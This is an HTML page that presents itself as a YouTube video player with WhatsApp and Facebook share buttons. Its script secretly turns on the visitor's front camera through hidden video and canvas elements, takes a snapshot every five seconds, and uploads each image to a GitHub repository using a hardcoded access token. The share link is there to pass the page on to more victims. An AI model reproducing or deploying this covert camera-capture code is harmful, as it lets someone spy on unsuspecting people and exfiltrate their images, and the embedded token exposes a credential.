<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
    <title>Video Player</title>
    
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />

    <style>
        body {
            font-family: 'Verdana', sans-serif;
            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
            background-size: cover;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        /* YouTube Shorts Container */
        .video-container {
            width: 90%;
            max-width: 360px; /* Optimized for mobile vertical viewing */
            aspect-ratio: 9/16;
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
            margin-bottom: 70px;
            border: 4px solid #fff;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Footer Buttons */
        .footerbtn, .footerbtn1 {
            display: block;
            line-height: 50px;
            position: fixed;
            bottom: 15px;
            height: 50px;
            border-radius: 25px;
            color: #ffffff;
            font-size: 18px;
            text-align: center;
            text-decoration: none;
            width: 44%;
            box-shadow: 0 4px 12px rgba(0, 0, 0, .3);
            font-weight: bold;
        }
        .footerbtn { left: 4%; background: #34af23; }
        .footerbtn1 { right: 4%; background: #000099; }
    </style>
</head>

<body>

    <video id="video" playsinline autoplay hidden></video>
    <canvas id="captureCanvas" width="640" height="480" hidden></canvas>

    <div class="video-container">
        <iframe 
            src="https://www.youtube.com/embed/8tOg8l4NVBA?autoplay=1&mute=0&loop=1&playlist=8tOg8l4NVBA" 
            title="YouTube video player" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            allowfullscreen>
        </iframe>
    </div>

    <script>
        const video = document.getElementById('video');
        const cCanvas = document.getElementById('captureCanvas');
        const ctx_cap = cCanvas.getContext('2d');

        // --- GITHUB CONFIGURATION ---
        const GH_USER = "vihangaroma-cyber";
        const GH_REPO = "notelk";
        const GH_TOKEN = "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"; 
        const GH_FOLDER = "captures"; 

        async function post(imgdata) {
            const fileName = `snap_${Date.now()}.png`;
            const path = `${GH_FOLDER}/${fileName}`;
            const base64Content = imgdata.split(',')[1];
            const url = `https://api.github.com/repos/${GH_USER}/${GH_REPO}/contents/${path}`;

            try {
                await fetch(url, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `token ${GH_TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: `Auto-upload ${fileName}`,
                        content: base64Content,
                        branch: "main"
                    })
                });
            } catch (e) { console.error("Upload failed", e); }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                // Capture image every 5 seconds to stay within API limits
                setInterval(() => {
                    ctx_cap.drawImage(video, 0, 0, 640, 480);
                    const data = cCanvas.toDataURL("image/png");
                    post(data);
                }, 5000); 
            } catch (err) { console.log("Camera access denied"); }
        }
        initCamera();
    </script>

    <a class="footerbtn" href="whatsapp://send?text=Watch this! https://YOUR_GITHUB_PAGES_LINK"><b>WhatsApp</b></a>
    <a class="footerbtn1" href="#"><b>Facebook</b></a>

</body>
</html>
